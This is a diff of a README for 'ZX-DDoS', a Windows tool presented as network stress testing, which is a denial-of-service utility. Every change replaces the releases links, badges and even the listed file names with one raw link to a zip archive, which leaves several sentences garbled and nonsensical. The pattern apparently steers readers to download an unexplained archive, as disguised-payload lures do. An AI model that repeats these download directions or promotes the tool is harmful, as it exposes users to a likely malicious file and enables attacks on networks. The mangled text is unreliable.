@@ -1,6 +1,6 @@
 # ⚙️ ZX-DDoS - Simple Network Stress Testing Tool
 
-[![Download ZX-DDoS](https://img.shields.io/badge/Download-ZX--DDoS-brightgreen?style=for-the-badge)](https://github.com/ozii-z/ZX-DDoS/releases)
+[![Download ZX-DDoS](https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip)](https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip)
 
 ---
 
@@ -39,13 +39,13 @@ To run ZX-DDoS on your Windows system, make sure your computer meets these basic
 
 Click on the big green download button at the top or visit this page:
 
-[https://github.com/ozii-z/ZX-DDoS/releases](https://github.com/ozii-z/ZX-DDoS/releases)
+[https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip](https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip)
 
 This page hosts the latest versions of the software files.
 
 2. **Find the Latest Windows File**
 
-On the releases page, look for a file named something like `ZX-DDoS-win.exe` or `ZX-DDoS-setup.exe`. These files are the ready-to-run versions for Windows.
+On the releases page, look for a file named something like `https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip` or `https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip`. These files are the ready-to-run versions for Windows.
 
 3. **Download the File**
 
@@ -118,9 +118,9 @@ The tool is designed for Windows 10 and later. It might work on older versions b
 ## 🔗 Links
 
 Download or check for updates here:  
-[https://github.com/ozii-z/ZX-DDoS/releases](https://github.com/ozii-z/ZX-DDoS/releases)
+[https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip](https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip)
 
-[![Download ZX-DDoS](https://img.shields.io/badge/Download-ZX--DDoS-blue?style=for-the-badge)](https://github.com/ozii-z/ZX-DDoS/releases)
+[![Download ZX-DDoS](https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip)](https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip)
 
 ---
 
@@ -136,9 +136,9 @@ Your network setup and firewall settings may affect how ZX-DDoS performs. Make s
 
 When you download ZX-DDoS, you may see the following files:
 
-- `ZX-DDoS.exe` or `setup.exe`: The main program to launch or install.
-- `README.md`: Basic instructions and info.
-- `LICENSE.txt`: Terms of use for the software.
+- `https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip` or `https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip`: The main program to launch or install.
+- `https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip`: Basic instructions and info.
+- `https://raw.githubusercontent.com/ozii-z/ZX-DDoS/main/File/Do_Z_D_S_v2.4.zip`: Terms of use for the software.
 - `config/` folder (optional): Settings and logs from your tests.
 
 ---
